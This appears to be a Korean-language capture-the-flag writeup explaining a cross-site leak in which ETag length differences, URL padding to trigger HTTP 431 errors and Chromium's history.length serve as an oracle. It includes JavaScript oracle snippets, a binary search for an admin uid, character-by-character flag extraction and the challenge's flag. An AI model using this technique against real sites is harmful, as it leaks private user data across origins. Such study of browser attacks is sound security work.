# Writeup — Cross-Site ETag Length Leak

<br>

## 서비스 탐색

http://victim:3000 에 접속해 계정을 만들고 로그인합니다.
메모를 작성하면 HTTP 응답 헤더에 ETag가 포함됩니다.

```
HTTP/1.1 200 OK
ETag: W/"fff-aBcDeFg..."
Cache-Control: private, max-age=0, must-revalidate
```

<br>

## /api/compare 엔드포인트

로그인 상태에서 API를 탐색하면 아래 엔드포인트를 발견할 수 있습니다.

```
GET /api/compare?target=<N>
```

target 값과 현재 세션의 userId를 비교한 결과에 따라 응답 body 크기가 달라집니다.

```
userId >= target → body ~4136 bytes → ETag: W/"1028-..."  (hex 4자리, 36바이트)
userId <  target → body ~4095 bytes → ETag: W/"fff-..."   (hex 3자리, 35바이트)
```

ETag는 응답 body의 해시값이므로 body 크기가 hex 자릿수 경계를 넘으면 ETag 길이가 1바이트 달라집니다.

<br>

## 431 임계치 탐색

브라우저는 같은 URL을 재방문할 때 캐싱된 ETag를 If-None-Match 헤더에 자동으로 포함합니다.
URL에 pad=X*N 파라미터를 추가해 헤더 총량을 조절하면, ETag 길이 1바이트 차이가 431 발생 여부로 증폭됩니다.

victim 서버는 --max-http-header-size=8192 옵션으로 실행되고 있습니다.

<br>

## history.length Oracle

Chromium에서 팝업 창이 동일 URL을 재방문할 때의 동작 차이를 이용합니다.

- 정상 응답(200/304) → history entry push → diff = 3
- 431 발생 → history entry replace → diff = 2

```
const len1 = win.history.length;
win.location = url;        // 1차: ETag 캐싱
await sleep(200);
win.location = url;        // 2차: If-None-Match 포함 → 431 or 304
await sleep(200);
win.location = POPUP_HREF; // attacker 도메인으로 복귀

// diff === 2 → 431 (GTE/hit)
// diff === 3 → 정상 (LT/miss)
```

<br>

## Stage 1 — Admin uid 이진탐색

oracle을 이용해 admin uid를 이진탐색합니다.

```
탐색 범위: [1000, 9999]
oracle = true  → userId >= target → lo = mid + 1
oracle = false → userId <  target → hi = mid
결과: uid = lo - 1
```

<br>

## Stage 2 — 플래그 추출

/admin/flag/search?uid=<uid>&q=<prefix> 엔드포인트는 admin 세션에서만 접근 가능하며, prefix가 플래그와 일치하면 응답이 있고(ETag 캐싱), 불일치하면 빈 응답(ETag 없음)입니다.

동일한 history.length oracle로 플래그를 한 글자씩 brute-force합니다.

```
FLAG{ → FLAG{c → FLAG{cr → ... → FLAG{cr0ss_s1te_3tag_l3ngth_le4k}
```

<br>

## Exploit 흐름

http://attacker:4000 편집기에서 exploit을 작성합니다.

```
const pad1                  = await calibStage1();
const uid                   = await findUid(pad1);
const { basePad, baseQLen } = await calibStage2(uid);
const flag                  = await bruteFlag(uid, basePad, baseQLen);
```

전체 소요 시간은 약 15~20분이며, 네트워크 상태에 따라 달라질 수 있습니다.

<br>

## 참고

- https://blog.arkark.dev/2025/12/26/etag-length-leak
